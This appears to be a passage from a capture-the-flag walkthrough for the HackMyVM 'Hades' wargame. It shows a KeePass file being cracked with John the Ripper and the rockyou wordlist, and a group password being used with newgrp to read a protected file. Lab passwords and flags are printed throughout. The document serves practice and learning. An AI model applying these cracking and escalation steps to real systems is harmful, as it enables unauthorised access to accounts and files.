                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


eos@hades.hackmyvm.eu's password: 
secretz.kbdx                                                                                                                                        100% 1902     7.3KB/s   00:00    

┌──(kali㉿kali)-[~/Desktop]
└─$ keepass2john secretz.kbdx > hash                                     

┌──(kali㉿kali)-[~/Desktop]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt            
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
heaven           (secretz.kbdx)     
1g 0:00:00:01 DONE (2024-07-03 09:57) 0.9174g/s 176.1p/s 176.1c/s 176.1C/s pepper..november
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
到网站上传文件及密码以后得到用户密码！sbUcegcdYTTWzTKojzgm
网站使用的是：https://app.keeweb.info/ 很好用！

## 30 gaia
```bash
es:~$ ls -la
total 40
drwxr-x--- 2 root gaia  4096 Apr  5 06:36 .
drwxr-xr-x 1 root root  4096 Apr  5 06:36 ..
-rw-r--r-- 1 gaia gaia   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 gaia gaia  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 gaia gaia   807 Apr 23  2023 .profile
-rw-r----- 1 root gaia    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root gaia    10 Apr  5 06:36 hpass1.txt
-rw-r----- 1 root powah   23 Apr  5 06:36 hpass2.txt
-rw-r----- 1 root gaia   146 Apr  5 06:36 mission.txt
gaia@hades:~$ grep -ra '\^*\^' .
grep: ./hpass2.txt: Permission denied
./flagz.txt:^NWelryzwJowjEaDWEiY^
gaia@hades:~$ cat mission.txt 
################
# MISSION 0x30 #
################

## EN ##
User halcyon wants all the powah.

## ES ##
La usuaria halcyon quiere todo el powah.
gaia@hades:~$ cat hpass1.txt

manuela

gaia@hades:~$ id powah
id: 'powah': no such user
gaia@hades:~$ find / -group powah -type f 2>/dev/null
/etc/w3m/ga
/pwned/gaia/hpass2.txt
gaia@hades:~$ sudo -l    
[sudo] password for gaia: 
Sorry, user gaia may not run sudo on hades.
gaia@hades:~$ ls -la /etc/w3m/ga
-rw-r----- 1 root powah 23 Jan 15  2019 /etc/w3m/ga
gaia@hades:~$ cat /etc/group | grep "powah"
powah:x:1000:
gaia@hades:~$ group
-bash: group: command not found
gaia@hades:~$ whoami;id
gaia
uid=2021(gaia) gid=2021(gaia) groups=2021(gaia)
gaia@hades:~$ cat hpass1.txt 

manuela

gaia@hades:~$ newgrp
gaia@hades:~$ whoami;id
gaia
uid=2021(gaia) gid=2021(gaia) groups=2021(gaia)
gaia@hades:~$ newgrp powah
Password:
gaia@hades:~$ whoami;id
gaia
uid=2021(gaia) gid=1000(powah) groups=1000(powah),2021(gaia)
gaia@hades:~$ cat hpass2.txt 

cuMRRameGdmhVxHcYYYs


```
